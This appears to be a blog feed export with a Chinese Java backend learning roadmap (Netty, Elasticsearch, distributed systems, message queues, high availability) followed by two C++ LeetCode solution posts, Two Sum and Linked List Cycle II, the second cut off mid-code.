<p><img src="https://pic1.zhimg.com/50/v2-8edcdf9da09d431d5a827737df1326f8_hd.jpg?source=1940ef5c" alt="img"><img src="https://pic1.zhimg.com/80/v2-8edcdf9da09d431d5a827737df1326f8_1440w.jpg?source=1940ef5c" alt="img"></p>
<p>这可能是全网质量最高并且免费的 Spring Boot 教程了，好评爆炸！</p>
<p>另外，Spring Boot 这块还有很多优质的开源教程，我已经整理好放到 <a href="https://link.zhihu.com/?target=https://github.com/CodingDocs/awesome-java%23springboot">awesome-java@SpringBoot</a> 中了。</p>
<p><img src="https://pic3.zhimg.com/50/v2-bd98e686b9da09ebbe25bfc843364147_hd.jpg?source=1940ef5c" alt="img"><img src="https://pic3.zhimg.com/80/v2-bd98e686b9da09ebbe25bfc843364147_1440w.jpg?source=1940ef5c" alt="img"></p>
<h3 id="Netty"><a href="#Netty" class="headerlink" title="Netty"></a><strong>Netty</strong></h3><p>但凡涉及到网络通信就必然必然离不开网络编程。 Netty 目前作为 Java 网络编程最热门的框架，毫不夸张地说是每个 Java 程序员必备的技能之一。</p>
<p><strong>为什么说学好 Netty 很有必要呢？</strong></p>
<ol>
<li>Netty 基于 NIO （NIO 是一种同步非阻塞的 I/O 模型，在 Java 1.4 中引入了 NIO ）。使用 Netty 可以极大地简化并简化了 TCP 和 UDP 套接字服务器等网络编程,并且性能以及安全性等很多方面都非常优秀。</li>
<li>我们平常经常接触的 Dubbo、RocketMQ、Elasticsearch、gRPC、Spark、Elasticsearch 等等热门开源项目都用到了 Netty。</li>
<li>大部分微服务框架底层涉及到网络通信的部分都是基于 Netty 来做的，比如说 Spring Cloud 生态系统中的网关 Spring Cloud Gateway 。</li>
</ol>
<p>下面是一些比较推荐的书籍/专栏。</p>
<p><strong><a href="https://link.zhihu.com/?target=https://book.douban.com/subject/27038538/">《Netty 实战》</a></strong></p>
<p><img src="https://pic4.zhimg.com/50/v2-8a4c942af44520f5d2c99c3d6f37b4dc_hd.jpg?source=1940ef5c" alt="img"><img src="https://pic4.zhimg.com/80/v2-8a4c942af44520f5d2c99c3d6f37b4dc_1440w.jpg?source=1940ef5c" alt="img"></p>
<p>这本书可以用来入门 Netty ，内容从 BIO 聊到了 NIO、之后才详细介绍为什么有 Netty 、Netty 为什么好用以及 Netty 重要的知识点讲解。</p>
<p>这本书基本把 Netty 一些重要的知识点都介绍到了，而且基本都是通过实战的形式讲解。</p>
<p><strong>《Netty 进阶之路：跟着案例学 Netty》</strong></p>
<p><img src="https://pic2.zhimg.com/50/v2-214ed872bb89b37b2b3c06b4c8c022e5_hd.jpg?source=1940ef5c" alt="img"><img src="https://pic2.zhimg.com/80/v2-214ed872bb89b37b2b3c06b4c8c022e5_1440w.jpg?source=1940ef5c" alt="img"></p>
<p>内容都是关于使用 Netty 的实践案例比如内存泄露这些东西。如果你觉得你的 Netty 已经完全入门了，并且你想要对 Netty 掌握的更深的话，推荐你看一下这本书。</p>
<p><strong>《Netty 入门与实战：仿写微信 IM 即时通讯系统》</strong></p>
<p><img src="https://pic2.zhimg.com/50/v2-31d3de0843d01caea292fc461ca00d55_hd.jpg?source=1940ef5c" alt="img"><img src="https://pic2.zhimg.com/80/v2-31d3de0843d01caea292fc461ca00d55_1440w.jpg?source=1940ef5c" alt="img"></p>
<p>通过一个基于 Netty 框架实现 IM 核心系统为引子，带你学习 Netty。整个小册的质量还是很高的，即使你没有 Netty 使用经验也能看懂。</p>
<h2 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a><strong>搜索引擎</strong></h2><p>搜索引擎用于提高搜索效率，功能和浏览器搜索引擎类似。比较常见的搜索引擎是 Elasticsearch（推荐） 和 Solr。</p>
<p>如果你要学习 Elasticsearch 的话，<a href="https://link.zhihu.com/?target=http://www.elasticsearch.cn/">Elastic 中文社区</a> 以及 <a href="https://link.zhihu.com/?target=https://www.elastic.co/cn/blog/">Elastic 官方博客</a> 都是非常不错的资源，上面会分享很多具体的实践案例。</p>
<p>除此之外，极客时间的<a href="https://link.zhihu.com/?target=http://gk.link/a/10bcT">《Elasticsearch 核心技术与实战》</a>这门课程非常赞！这门课基于 Elasticsearch 7.1 版本讲解，比较新。并且，作者是 eBay 资深技术专家，有 20 年的行业经验，课程质量有保障！</p>
<p><img src="https://pic2.zhimg.com/50/v2-057c22f1e83338a78f2e6b22e5da777d_hd.jpg?source=1940ef5c" alt="img"><img src="https://pic2.zhimg.com/80/v2-057c22f1e83338a78f2e6b22e5da777d_1440w.jpg?source=1940ef5c" alt="img"></p>
<p>如果你想看书的话，可以考虑一下 《Elasticsearch 实战》 这本书。不过，需要说明的是，这本书中的 Elasticsearch 版本比较老，你可以将其作为一个参考书籍来看，有一些原理性的东西可以在上面找找答案。</p>
<p><img src="https://pic2.zhimg.com/50/v2-d2048059f45eac3a26001579c7826d8f_hd.jpg?source=1940ef5c" alt="img"><img src="https://pic2.zhimg.com/80/v2-d2048059f45eac3a26001579c7826d8f_1440w.jpg?source=1940ef5c" alt="img"></p>
<p>如果你想进一步深入研究 Elasticsearch 原理的话，可以看看张超老师的《Elasticsearch 源码解析与优化实战》这本书。这是市面上唯一一本写 Elasticsearch 源码的书。</p>
<p><img src="https://pic3.zhimg.com/50/v2-85d4049c868a55ecbc76ae6c329eaebf_hd.jpg?source=1940ef5c" alt="img"><img src="https://pic3.zhimg.com/80/v2-85d4049c868a55ecbc76ae6c329eaebf_1440w.jpg?source=1940ef5c" alt="img"></p>
<h2 id="分布式"><a href="#分布式" class="headerlink" title="分布式"></a><strong>分布式</strong></h2><p>下面我们开始学习分布式以及高并发、高可用了。</p>
<p>这块内容的话，对于每一个知识点没有特定的书籍。我就推荐 2 本我觉得还不错的书籍吧！这两把书籍基本把下面涉及到的知识点给涵盖了。</p>
<p>第一本是李运华老师的**<a href="https://link.zhihu.com/?target=https://book.douban.com/subject/30335935/">《从零开始学架构》</a>** 。</p>
<p><img src="https://pic4.zhimg.com/50/v2-145c577cd6856daca487eec730ffc394_hd.jpg?source=1940ef5c" alt="img"><img src="https://pic4.zhimg.com/80/v2-145c577cd6856daca487eec730ffc394_1440w.jpg?source=1940ef5c" alt="img"></p>
<p>这本书对应的有一个极客时间的专栏—<a href="https://link.zhihu.com/?target=http://gk.link/a/10pKZ">《从零开始学架构》</a>，里面的很多内容都是这个专栏里面的，两者买其一就可以了。</p>
<p>第二本是余老师的 <strong><a href="https://link.zhihu.com/?target=https://book.douban.com/subject/30443578/">《软件架构设计：大型网站技术架构与业务架构融合之道》</a></strong> 。</p>
<p><img src="https://pic1.zhimg.com/50/v2-fe7286730c9ea0f94196b5e9f1dd3e07_hd.jpg?source=1940ef5c" alt="img"><img src="https://pic1.zhimg.com/80/v2-fe7286730c9ea0f94196b5e9f1dd3e07_1440w.jpg?source=1940ef5c" alt="img"></p>
<p>事务与锁、分布式（CAP、分布式事务……）、高并发、高可用这本书都有介绍到。值得推荐！良心好书！</p>
<h3 id="理论"><a href="#理论" class="headerlink" title="理论"></a><strong>理论</strong></h3><h3 id="CAP-理论"><a href="#CAP-理论" class="headerlink" title="CAP 理论"></a><strong>CAP 理论</strong></h3><p>CAP 也就是 Consistency（一致性）、Availability（可用性）、Partition Tolerance（分区容错性） 这三个单词首字母组合。</p>
<p>关于 CAP 的详细解读请看：<a href="https://link.zhihu.com/?target=https://snailclimb.gitee.io/javaguide/%23/docs/system-design/distributed-system/CAP%E7%90%86%E8%AE%BA">《CAP 理论解读》</a>。</p>
<h3 id="BASE-理论"><a href="#BASE-理论" class="headerlink" title="BASE 理论"></a><strong>BASE 理论</strong></h3><p><strong>BASE</strong> 是 <strong>Basically Available（基本可用）</strong> 、<strong>Soft-state（软状态）</strong> 和 <strong>Eventually Consistent（最终一致性）</strong> 三个短语的缩写。BASE 理论是对 CAP 中一致性和可用性权衡的结果，其来源于对大规模互联网系统分布式实践的总结，是基于 CAP 定理逐步演化而来的，它大大降低了我们对系统的要求。</p>
<p>关于 CAP 的详细解读请看：<a href="https://link.zhihu.com/?target=https://snailclimb.gitee.io/javaguide/%23/docs/system-design/distributed-system/BASE%E7%90%86%E8%AE%BA">《BASE 理论解读》</a>。</p>
<h3 id="Paxos-算法和-Raft-算法"><a href="#Paxos-算法和-Raft-算法" class="headerlink" title="Paxos 算法和 Raft 算法"></a><strong>Paxos 算法和 Raft 算法</strong></h3><p><strong>Paxos 算法</strong>诞生于 1990 年，这是一种解决分布式系统一致性的经典算法 。但是，由于 Paxos 算法非常难以理解和实现，不断有人尝试简化这一算法。到了 2013 年才诞生了一个比 Paxos 算法更易理解和实现的分布式一致性算法—<strong>Raft 算法</strong>。</p>
<h3 id="RPC"><a href="#RPC" class="headerlink" title="RPC"></a><strong>RPC</strong></h3><p>RPC 让调用远程服务调用像调用本地方法那样简单。</p>
<p>Dubbo 是一款国产的 RPC 框架，由阿里开源。相关阅读：</p>
<ul>
<li><a href="https://link.zhihu.com/?target=https://snailclimb.gitee.io/javaguide/%23/docs/system-design/distributed-system/rpc/Dubbo">Dubbo 常见问题总结</a></li>
<li><a href="https://link.zhihu.com/?target=https://snailclimb.gitee.io/javaguide/%23/docs/system-design/distributed-system/rpc/%E6%9C%8D%E5%8A%A1%E4%B9%8B%E9%97%B4%E7%9A%84%E8%B0%83%E7%94%A8%E4%B8%BA%E5%95%A5%E4%B8%8D%E7%9B%B4%E6%8E%A5%E7%94%A8HTTP%E8%80%8C%E7%94%A8RPC">服务之间的调用为啥不直接用 HTTP 而用 RPC？</a></li>
</ul>
<h3 id="服务注册与发现"><a href="#服务注册与发现" class="headerlink" title="服务注册与发现"></a><strong>服务注册与发现</strong></h3><p>Eureka、Zookeeper、Consul、Nacos 都可以提供服务注册与发现的功能。</p>
<p><img src="https://pic1.zhimg.com/50/v2-c5458b7d70c752fcaa3f42e1ee1aa2ea_hd.jpg?source=1940ef5c" alt="img"><img src="https://pic1.zhimg.com/80/v2-c5458b7d70c752fcaa3f42e1ee1aa2ea_1440w.jpg?source=1940ef5c" alt="img"></p>
<h3 id="API-网关"><a href="#API-网关" class="headerlink" title="API 网关"></a><strong>API 网关</strong></h3><p>网关主要用于请求转发、安全认证、协议转换、容灾。</p>
<p>SpringCloud Gateway 是 Spring Cloud 的一个全新项目，为了取代 Netflix Zuul。</p>
<h3 id="配置中心"><a href="#配置中心" class="headerlink" title="配置中心"></a><strong>配置中心</strong></h3><p>微服务下，业务的发展一般会导致服务数量的增加，进而导致程序配置（服务地址、数据库参数等等）增多。</p>
<p>传统的配置文件的方式已经无法满足当前需求，主要有两点原因：一是安全性得不到保障（配置放在代码库中容易泄露）；二是时效性不行 （修改配置需要重启服务才能生效）。</p>
<p>Spring Cloud Config、Nacos 、Apollo、K8s ConfigMap 都可以用来做配置中心。</p>
<p>Apollo 和 Nacos 我个人更喜欢。Nacos 使用起来更加顺手，Apollo 在配置管理方面做的更加全面。</p>
<h3 id="分布式-id"><a href="#分布式-id" class="headerlink" title="分布式 id"></a><strong>分布式 id</strong></h3><p>日常开发中，我们需要对系统中的各种数据使用 ID 唯一表示，比如用户 ID 对应且仅对应一个人，商品 ID 对应且仅对应一件商品，订单 ID 对应且仅对应一个订单。</p>
<p><img src="https://pic4.zhimg.com/50/v2-21c5fb2a333d04d70ccf2554e4a66995_hd.jpg?source=1940ef5c" alt="img"><img src="https://pic4.zhimg.com/80/v2-21c5fb2a333d04d70ccf2554e4a66995_1440w.jpg?source=1940ef5c" alt="img"></p>
<p>简单来说，<strong>ID 就是数据的唯一标识</strong>。</p>
<p>分布式 ID 是分布式系统下的 ID。分布式 ID 不存在与现实生活中，属于计算机系统中的一个概念。</p>
<p>我简单举一个分库分表的例子。</p>
<p>我司的一个项目，使用的是单机 MySQL 。但是，没想到的是，项目上线一个月之后，随着使用人数越来越多，整个系统的数据量将越来越大。</p>
<p>单机 MySQL 已经没办法支撑了，需要进行分库分表（推荐 Sharding-JDBC）。</p>
<p>在分库之后， 数据遍布在不同服务器上的数据库，数据库的自增主键已经没办法满足生成的主键唯一了。<strong>我们如何为不同的数据节点生成全局唯一主键呢？</strong></p>
<p><img src="https://pic4.zhimg.com/50/v2-1f699f3733924441f3707926da884744_hd.jpg?source=1940ef5c" alt="img"><img src="https://pic4.zhimg.com/80/v2-1f699f3733924441f3707926da884744_1440w.jpg?source=1940ef5c" alt="img"></p>
<p>这个时候就需要生成<strong>分布式 ID</strong>了。</p>
<p>分布式 ID 的解决方案有很多比如 ：</p>
<ul>
<li>算法 ：UUID、Snowflake</li>
<li>开源框架 ： UidGenerator、Leaf 、Tinyid</li>
</ul>
<h3 id="分布式事务"><a href="#分布式事务" class="headerlink" title="分布式事务"></a><strong>分布式事务</strong></h3><p>微服务架构下，一个系统被拆分为多个小的微服务。</p>
<p>每个微服务都可能存在不同的机器上，并且每个微服务可能都有一个单独的数据库供自己使用。这种情况下，一组操作可能会涉及到多个微服务以及多个数据库。</p>
<p>举个例子：电商系统中，你创建一个订单往往会涉及到订单服务（订单数加一）、库存服务（库存减一）等等服务，这些服务会有供自己单独使用的数据库。</p>
<p><img src="https://pic1.zhimg.com/50/v2-feaa7d9765154fa367bc008444d208c3_hd.jpg?source=1940ef5c" alt="img"><img src="https://pic1.zhimg.com/80/v2-feaa7d9765154fa367bc008444d208c3_1440w.jpg?source=1940ef5c" alt="img"></p>
<p><strong>那么如何保证这一组操作要么都执行成功，要么都执行失败呢？</strong></p>
<p>这个时候单单依靠数据库事务就不行了！我们就需要引入 <strong>分布式事务</strong> 这个概念了！</p>
<p>常用分布式事务解决方案有 Seata 和 Hmily。</p>
<ol>
<li><strong><a href="https://link.zhihu.com/?target=https://seata.io/zh-cn/index.html">Seata</a></strong> :Seata 是一款开源的分布式事务解决方案，致力于在微服务架构下提供高性能和简单易用的分布式事务服务。</li>
<li><strong><a href="https://link.zhihu.com/?target=https://gitee.com/shuaiqiyu/hmily">Hmily</a></strong> : 金融级分布式事务解决方案</li>
</ol>
<h3 id="分布式链路追踪"><a href="#分布式链路追踪" class="headerlink" title="分布式链路追踪"></a><strong>分布式链路追踪</strong></h3><p>不同于单体架构，在分布式架构下，请求需要在多个服务之间调用，排查问题会非常麻烦。我们需要分布式链路追踪系统来解决这个痛点。</p>
<p>目前分布式链路追踪系统基本都是根据谷歌的《Dapper 大规模分布式系统的跟踪系统》这篇论文发展而来，主流的有 Pinpoint，Skywalking ，CAT（当然也有其他的例如 Zipkin，Jaeger 等产品，不过总体来说不如前面选取的 3 个完成度高）等。</p>
<p>Zipkin 是 Twitter 公司开源的一个分布式链路追踪工具，Spring Cloud Sleuth 实际是基于 Zipkin 的。</p>
<p>SkyWalking 是国人吴晟（华为）开源的一款分布式追踪，分析，告警的工具，现在是 Apache 旗下开源项目</p>
<h2 id="微服务"><a href="#微服务" class="headerlink" title="微服务"></a><strong>微服务</strong></h2><p>微服务的很多东西实际在分布式这一节已经提到了。</p>
<p>我这里就再补充一些微服务架构中，经常使用到的一些组件。</p>
<ul>
<li><strong>声明式服务调用</strong> : Feign</li>
<li><strong>负载均衡</strong> : Ribbon</li>
<li>……</li>
</ul>
<h2 id="高并发"><a href="#高并发" class="headerlink" title="高并发"></a><strong>高并发</strong></h2><h3 id="消息队列"><a href="#消息队列" class="headerlink" title="消息队列"></a><strong>消息队列</strong></h3><p><img src="https://pic2.zhimg.com/50/v2-4903cf7307350d41a16d0277112d5424_hd.jpg?source=1940ef5c" alt="img"><img src="https://pic2.zhimg.com/80/v2-4903cf7307350d41a16d0277112d5424_1440w.jpg?source=1940ef5c" alt="img"></p>
<p>消息队列在分布式系统中主要是为了解耦和削峰。相关阅读：<a href="https://link.zhihu.com/?target=https://snailclimb.gitee.io/javaguide/%23/docs/system-design/distributed-system/message-queue/message-queue">消息队列常见问题总结</a>。</p>
<p>常用的消息队列如下：</p>
<ol>
<li><strong><a href="https://link.zhihu.com/?target=https://github.com/apache/rocketmq">RocketMQ</a></strong> ：阿里巴巴开源的一款高性能、高吞吐量的分布式消息中间件。</li>
<li><strong><a href="https://link.zhihu.com/?target=https://github.com/apache/kafka">Kafaka</a></strong>: Kafka 是一种分布式的，基于发布 / 订阅的消息系统。关于它的入门可以查看：<a href="https://link.zhihu.com/?target=https://github.com/Snailclimb/JavaGuide/blob/master/docs/system-design/data-communication/Kafka%E5%85%A5%E9%97%A8%E7%9C%8B%E8%BF%99%E4%B8%80%E7%AF%87%E5%B0%B1%E5%A4%9F%E4%BA%86.md">Kafka 入门看这一篇就够了</a></li>
<li><strong><a href="https://link.zhihu.com/?target=https://github.com/rabbitmq">RabbitMQ</a></strong> :由 erlang 开发的基于 AMQP（Advanced Message Queue 高级消息队列协议）协议实现的消息队列。</li>
</ol>
<h3 id="读写分离-amp-分库分表"><a href="#读写分离-amp-分库分表" class="headerlink" title="读写分离&amp;分库分表"></a><strong>读写分离&amp;分库分表</strong></h3><p>读写分离主要是为了将数据库的读和写操作分不到不同的数据库节点上。主服务器负责写，从服务器负责读。另外，一主一从或者一主多从都可以。</p>
<p>读写分离可以大幅提高读性能，小幅提高写的性能。因此，读写分离更适合单机并发读请求比较多的场景。</p>
<p><img src="https://pic4.zhimg.com/50/v2-36f2ed6de6018bb4cebab32623373864_hd.jpg?source=1940ef5c" alt="img"><img src="https://pic4.zhimg.com/80/v2-36f2ed6de6018bb4cebab32623373864_1440w.jpg?source=1940ef5c" alt="img"></p>
<p>分库分表是为了解决由于库、表数据量过大，而导致数据库性能持续下降的问题。</p>
<p>常见的分库分表工具有：sharding-jdbc（当当）、TSharding（蘑菇街）、MyCAT（基于 Cobar）、Cobar（阿里巴巴）…。 推荐使用 sharding-jdbc。 因为，sharding-jdbc 是一款轻量级 Java 框架，以 jar 包形式提供服务，不要我们做额外的运维工作，并且兼容性也很好。</p>
<p><img src="https://pic1.zhimg.com/50/v2-635a97b84f0e3b718b1cfdc61a0bbe08_hd.jpg?source=1940ef5c" alt="img"><img src="https://pic1.zhimg.com/80/v2-635a97b84f0e3b718b1cfdc61a0bbe08_1440w.jpg?source=1940ef5c" alt="img"></p>
<p>相关阅读： <a href="https://link.zhihu.com/?target=https://snailclimb.gitee.io/javaguide/%23/docs/system-design/%E8%AF%BB%E5%86%99%E5%88%86%E7%A6%BB&%E5%88%86%E5%BA%93%E5%88%86%E8%A1%A8">读写分离&amp;分库分表常见问题总结</a></p>
<h3 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a><strong>负载均衡</strong></h3><p>负载均衡系统通常用于将任务比如用户请求处理分配到多个服务器处理以提高网站、应用或者数据库的性能和可靠性。</p>
<p>常见的负载均衡系统包括 3 种：</p>
<ol>
<li><strong>DNS 负载均衡</strong> ：一般用来实现地理级别的均衡。</li>
<li><strong>硬件负载均衡</strong> ： 通过单独的硬件设备比如 F5 来实现负载均衡功能（硬件的价格一般很贵）。</li>
<li><strong>软件负载均衡</strong> ：通过负载均衡软件比如 Nginx 来实现负载均衡功能。</li>
</ol>
<h2 id="高可用"><a href="#高可用" class="headerlink" title="高可用"></a><strong>高可用</strong></h2><p>高可用描述的是一个系统在大部分时间都是可用的，可以为我们提供服务的。高可用代表系统即使在发生硬件故障或者系统升级的时候，服务仍然是可用的 。</p>
<p>相关阅读： <strong>《<a href="https://link.zhihu.com/?target=https://snailclimb.gitee.io/javaguide/%23/docs/system-design/high-availability/%E5%A6%82%E4%BD%95%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E9%AB%98%E5%8F%AF%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%A6%81%E8%80%83%E8%99%91%E5%93%AA%E4%BA%9B%E5%9C%B0%E6%96%B9">如何设计一个高可用系统？要考虑哪些地方？</a>》</strong> 。</p>
<h3 id="限流-amp-降级-amp-熔断"><a href="#限流-amp-降级-amp-熔断" class="headerlink" title="限流&amp;降级&amp;熔断"></a><strong>限流&amp;降级&amp;熔断</strong></h3><p>限流是从用户访问压力的角度来考虑如何应对系统故障。限流为了对服务端的接口接受请求的频率进行限制，防止服务挂掉。比如某一接口的请求限制为 100 个每秒, 对超过限制的请求放弃处理或者放到队列中等待处理。限流可以有效应对突发请求过多。相关阅读：<a href="https://link.zhihu.com/?target=https://snailclimb.gitee.io/javaguide/%23/docs/system-design/high-availability/limit-request">限流算法有哪些？</a></p>
<p>降级是从系统功能优先级的角度考虑如何应对系统故障。服务降级指的是当服务器压力剧增的情况下，根据当前业务情况及流量对一些服务和页面有策略的降级，以此释放服务器资源以保证核心任务的正常运行。</p>
<p>熔断和降级是两个比较容易混淆的概念，两者的含义并不相同。</p>
<p>降级的目的在于应对系统自身的故障，而熔断的目的在于应对当前系统依赖的外部系统或者第三方系统的故障。</p>
<p><a href="https://link.zhihu.com/?target=https://github.com/Netflix/Hystrix">Hystrix</a> 和 <a href="https://link.zhihu.com/?target=https://github.com/alibaba/Sentinel">Sentinel</a> 都能实现限流、降级、熔断。</p>
<p>Hystrix 是 Netflix 开源的熔断降级组件，Sentinel 是阿里中间件团队开源的一款不光具有熔断降级功能，同时还支持系统负载保护的组件。</p>
<p>两者都是主要做熔断降级 ，那么两者到底有啥异同呢？该如何选择呢？</p>
<p><a href="https://link.zhihu.com/?target=https://github.com/alibaba/Sentinel/wiki/Sentinel-%E4%B8%8E-Hystrix-%E7%9A%84%E5%AF%B9%E6%AF%94">Sentinel 的 wiki 中已经详细描述了其与 Hystrix 的区别</a>，你可以看看。</p>
<h3 id="排队"><a href="#排队" class="headerlink" title="排队"></a><strong>排队</strong></h3><p>另类的一种限流，类比于现实世界的排队。玩过英雄联盟的小伙伴应该有体会，每次一有活动，就要经历一波排队才能进入游戏。</p>
<h3 id="集群"><a href="#集群" class="headerlink" title="集群"></a><strong>集群</strong></h3><p>相同的服务部署多份，避免单点故障。</p>
<h3 id="超时和重试机制"><a href="#超时和重试机制" class="headerlink" title="超时和重试机制"></a><strong>超时和重试机制</strong></h3><p><strong>一旦用户的请求超过某个时间得不到响应就结束此次请求并抛出异常。</strong> 如果不进行超时设置可能会导致请求响应速度慢，甚至导致请求堆积进而让系统无法在处理请求。</p>
<p>另外，重试的次数一般设为 3 次，再多次的重试没有好处，反而会加重服务器压力（部分场景使用失败重试机制会不太适合）。</p>
<p>我是Guide哥，开源项目 <a href="https://link.zhihu.com/?target=https://github.com/Snailclimb/JavaGuide">JavaGuide</a> 作者，Github：<a href="https://link.zhihu.com/?target=https://github.com/Snailclimb">Snailclimb - Overview</a> 。本回答为我本人原创，如需转载，还请注明出处啊！</p>
<p>欢迎关注 <a href="https://www.zhihu.com/people/ee0f19babdc46c21672264080ad7a641">@JavaGuide</a>,我会持续分享原创干货~</p>
]]></content>
  </entry>
  <entry>
    <title>Leetcode 1.两数之和</title>
    <url>/2021/04/14/Leetcode-1-%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C/</url>
    <content><![CDATA[<h4 id="1-两数之和"><a href="#1-两数之和" class="headerlink" title="1. 两数之和"></a><a href="https://leetcode-cn.com/problems/two-sum/">1. 两数之和</a></h4><a id="more"></a>

<p>给定一个整数数组 <code>nums</code> 和一个整数目标值 <code>target</code>，请你在该数组中找出 <strong>和为目标值</strong> 的那 <strong>两个</strong> 整数，并返回它们的数组下标。</p>
<p>你可以假设每种输入只会对应一个答案。但是，数组中同一个元素在答案里不能重复出现。</p>
<p>你可以按任意顺序返回答案。</p>
<p><strong>示例 1：</strong></p>
<pre class="line-numbers language-none"><code class="language-none">输入：nums &#x3D; [2,7,11,15], target &#x3D; 9
输出：[0,1]
解释：因为 nums[0] + nums[1] &#x3D;&#x3D; 9 ，返回 [0, 1] 。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><strong>示例 2：</strong></p>
<pre class="line-numbers language-none"><code class="language-none">输入：nums &#x3D; [3,2,4], target &#x3D; 6
输出：[1,2]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><strong>示例 3：</strong></p>
<pre class="line-numbers language-none"><code class="language-none">输入：nums &#x3D; [3,3], target &#x3D; 6
输出：[0,1]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>



<p><strong>提示：</strong></p>
<ul>
<li><code>2 &lt;= nums.length &lt;= 103</code></li>
<li><code>-109 &lt;= nums[i] &lt;= 109</code></li>
<li><code>-109 &lt;= target &lt;= 109</code></li>
<li><strong>只会存在一个有效答案</strong></li>
</ul>
<blockquote>
<p>思路及算法</p>
</blockquote>
<ul>
<li><p>注意到方法一的时间复杂度较高的原因是寻找 target - x 的时间复杂度过高。因此，我们需要一种更优秀的方法，能够快速寻找数组中是否存在目标元素。如果存在，我们需要找出它的索引。</p>
</li>
<li><p>使用哈希表，可以将寻找 target - x 的时间复杂度降低到从 O(N) 降低到 O(1)。</p>
</li>
<li><p>这样我们创建一个哈希表，对于每一个 x，我们首先查询哈希表中是否存在 target - x，然后将 x 插入到哈希表中，即可保证不会让 x 和自己匹配。</p>
</li>
</ul>
<p>\[y = {f_{ {g_1}}}(x)\]</p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">class Solution &#123;
public:
    vector&lt;int&gt; twoSum(vector&lt;int&gt;&amp; nums, int target) &#123;
        unordered_map&lt;int, int&gt; hashtable;
        for (int i &#x3D; 0; i &lt; nums.size(); ++i) &#123;
            auto it &#x3D; hashtable.find(target - nums[i]);
            if (it !&#x3D; hashtable.end()) &#123;
                return &#123;it-&gt;second, i&#125;;
            &#125;
            hashtable[nums[i]] &#x3D; i;
        &#125;
        return &#123;&#125;;
    &#125;
&#125;;

<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

]]></content>
  </entry>
  <entry>
    <title>Leetcode 142. 环形链表 II</title>
    <url>/2021/04/11/Leetcode-142-%E7%8E%AF%E5%BD%A2%E9%93%BE%E8%A1%A8-II/</url>
    <content><![CDATA[<h4 id="142-环形链表-II"><a href="#142-环形链表-II" class="headerlink" title="142. 环形链表 II"></a><a href="https://leetcode-cn.com/problems/linked-list-cycle-ii/">142. 环形链表 II</a></h4><a id="more"></a>

<p>给定一个链表，返回链表开始入环的第一个节点。 如果链表无环，则返回 <code>null</code>。</p>
<p>为了表示给定链表中的环，我们使用整数 <code>pos</code> 来表示链表尾连接到链表中的位置（索引从 0 开始）。 如果 <code>pos</code> 是 <code>-1</code>，则在该链表中没有环。<strong>注意，<code>pos</code> 仅仅是用于标识环的情况，并不会作为参数传递到函数中。</strong></p>
<p><strong>说明：</strong>不允许修改给定的链表。</p>
<p><strong>进阶：</strong></p>
<ul>
<li>你是否可以使用 <code>O(1)</code> 空间解决此题？</li>
</ul>
<p><strong>示例 1：</strong></p>
<p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/07/circularlinkedlist.png" alt="img"></p>
<pre class="line-numbers language-none"><code class="language-none">输入：head &#x3D; [3,2,0,-4], pos &#x3D; 1
输出：返回索引为 1 的链表节点
解释：链表中有一个环，其尾部连接到第二个节点。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><strong>示例 2：</strong></p>
<p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/07/circularlinkedlist_test2.png" alt="img"></p>
<pre class="line-numbers language-none"><code class="language-none">输入：head &#x3D; [1,2], pos &#x3D; 0
输出：返回索引为 0 的链表节点
解释：链表中有一个环，其尾部连接到第一个节点。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><strong>示例 3：</strong></p>
<p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/07/circularlinkedlist_test3.png" alt="img"></p>
<pre class="line-numbers language-none"><code class="language-none">输入：head &#x3D; [1], pos &#x3D; -1
输出：返回 null
解释：链表中没有环。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>



<p><strong>提示：</strong></p>
<ul>
<li>链表中节点的数目范围在范围 <code>[0, 104]</code> 内</li>
<li><code>-105 &lt;= Node.val &lt;= 105</code></li>
<li><code>pos</code> 的值为 <code>-1</code> 或者链表中的一个有效索引</li>
</ul>
<blockquote>
<p> 题解<br>对于链表找环路的问题，有一个通用的解法——快慢指针（Floyd 判圈法）。给定两个指针，<br>分别命名为 slow 和 fast，起始位置在链表的开头。每次 fast 前进两步，slow 前进一步。如果 fast<br>可以走到尽头，那么说明没有环路；如果 fast 可以无限走下去，那么说明一定有环路，且一定存<br>在一个时刻 slow 和 fast 相遇。当 slow 和 fast 第一次相遇时，我们将 fast 重新移动到链表开头，并<br>让 slow 和 fast 每次都前进一步。当 slow 和 fast 第二次相遇时，相遇的节点即为环路的开始点。</p>
</blockquote>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">&#x2F;**
 * Definition for singly-linked list.
 * struct ListNode &#123;
 *     int val;
 *     ListNode *next;
 *     ListNode(int x) : val(x), next(NULL) &#123;&#125;
 * &#125;;
 *&#x2F;
class Solution &#123;
public:
    ListNode *detectCycle(ListNode *head) 
    &#123;
        ListNode *slow&#x3D;head,*fast&#x3D;head;
        &#x2F;&#x2F; 判断是否存在环路
        do
        &#123;
            if(!fast || !fast-&gt;next) return NULL;
            fast&#x3D;fast-&gt;next-&gt;next;
            slow&#x3D;slow-&gt;next;
        &#125;while(fast !&#x3D;slow);
        &#x2F;&#x2F; 如果存在，查找环路节点
        fast&#x3D;head;
        while(fast !&#x3D;slow)
        &#123;
            fast&#x3D;fast-&gt;next;
            slow&#x3D;slow-&gt;next;
        &#125;
        return fast;
    &#125;
